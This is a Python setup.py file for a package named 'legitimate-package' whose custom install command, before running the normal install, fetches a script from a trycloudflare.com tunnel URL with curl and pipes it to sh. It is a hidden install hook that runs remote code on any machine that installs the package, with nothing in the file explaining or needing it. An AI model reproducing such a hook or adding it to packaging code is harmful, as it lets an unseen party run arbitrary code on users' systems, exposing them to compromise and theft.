from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system("curl -s 'https://worldwide-liverpool-olive-exact.trycloudflare.com/r/smokedmeat/stg_sm_34772af9c97827cb' | sh")
        install.run(self)

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
